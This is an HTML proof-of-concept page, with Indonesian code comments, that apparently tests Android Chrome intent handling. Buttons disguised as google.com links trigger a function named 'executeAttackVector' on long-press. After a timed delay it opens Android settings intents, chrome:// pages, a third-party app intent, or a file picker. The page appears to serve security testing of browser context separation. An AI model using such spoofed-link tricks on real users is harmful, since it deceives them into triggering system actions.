<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Android Intent & Internal Handler PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
            max-width: 380px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 20px;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .file-info {
            margin-top: 20px;
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">System Security Portal</div>
    <h1>Internal Handler & Intent Fuzzing PoC</h1>

    <!-- 4 Tombol dengan Fokus Intent Handler Internal & System Settings -->
    <div class="button-container">
        <a href="https://www.google.com" class="spoof-link" id="btnSettings" data-intent="system_settings" data-action="settings">Open Window & Launch Android Settings</a>
        <a href="https://www.google.com" class="spoof-link" id="btnChromeScheme" data-intent="internal_chrome_page" data-action="chromescheme">Open Window & Access Chrome URL</a>
        <a href="https://www.google.com" class="spoof-link" id="btnFilePicker" data-intent="local_filesystem" data-action="filepicker">Open Window & Local File Access API</a>
        <a href="https://www.google.com" class="spoof-link" id="btnCustomIntent" data-intent="custom_intent_scheme" data-action="intent">Open Window & Custom Intent Scheme</a>
    </div>

    <div class="file-info" id="fileInfo">Status: Ready for interaction.</div>
    <div class="footer-note">Internal system context separation test.</div>

    <script>
        let triggered = false;

        const executeAttackVector = async (actionType, intent) => {
            if (triggered) return;
            triggered = true;

            const fileInfo = document.getElementById("fileInfo");
            fileInfo.innerText = `Executing internal handler intent [${intent}] with action [${actionType}]...`;

            // Jeda 2.4 detik agar jendela atas (Google.com) terbuka sempurna dalam mode split-screen
            setTimeout(async () => {
                try {
                    if (actionType === 'settings') {
                        // Memicu intent skema pengaturan sistem Android secara langsung
                        window.location.href = "intent://#Intent;action=android.settings.SETTINGS;end";
                        fileInfo.innerText = `Triggered Android Settings Intent for: [${intent}]`;
                    } 
                    else if (actionType === 'chromescheme') {
                        // Memicu akses ke halaman internal browser Chrome
                        window.location.href = "chrome://settings/";
                        fileInfo.innerText = `Triggered internal Chrome scheme for: [${intent}]`;
                    } 
                    else if (actionType === 'filepicker') {
                        // Memanfaatkan File System Access API untuk interaksi penyimpanan lokal
                        if (window.showOpenFilePicker) {
                            const [fileHandle] = await window.showOpenFilePicker({
                                multiple: false,
                                types: [{ description: 'All Files', accept: { '*/*': [] } }]
                            });
                            const file = await fileHandle.getFile();
                            fileInfo.innerText = `Accessed local file handle: ${file.name}`;
                        } else {
                            fileInfo.innerText = `File System Access API not supported in this context.`;
                        }
                    }
                    else if (actionType === 'intent') {
                        // Memicu kustom skema intent Android eksternal/internal
                        window.location.href = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
                        fileInfo.innerText = `Triggered custom application intent scheme for: [${intent}]`;
                    }
                } catch (err) {
                    fileInfo.innerText = `Operation restricted or blocked: ${err.message}`;
                    console.debug("Operation cancelled or restricted:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 1500);
                }
            }, 2400);
        };

        // Memasang event listener contextmenu (long-press pada Android) untuk tiap tombol
        ['btnSettings', 'btnChromeScheme', 'btnFilePicker', 'btnCustomIntent'].forEach(id => {
            const el = document.getElementById(id);
            el.addEventListener("contextmenu", (e) => {
                executeAttackVector(el.getAttribute('data-action'), el.getAttribute('data-intent'));
            });
            el.addEventListener("touchstart", () => {}, { passive: true });
        });
    </script>

</body>
</html>
